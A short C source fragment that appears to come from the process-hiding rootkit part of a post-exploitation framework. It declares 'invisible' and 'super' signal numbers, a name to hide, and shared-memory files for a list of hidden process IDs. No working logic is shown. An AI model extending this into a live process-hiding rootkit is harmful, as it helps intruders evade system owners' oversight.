#include <stdio.h>
#include <stdlib.h>

enum {
    SIGINVIS = 31,
    SIGSUPER = 64,
    SIGMODINVIS = 63,
};

const char* HIDE_ME = "emp3r0r";
const char* SHM_FILE = "/dev/shm/emp3r0r_pids";
const char* EmpPATH = "/dev/shm/emp3r0r";
FILE* SHM_FD = NULL;
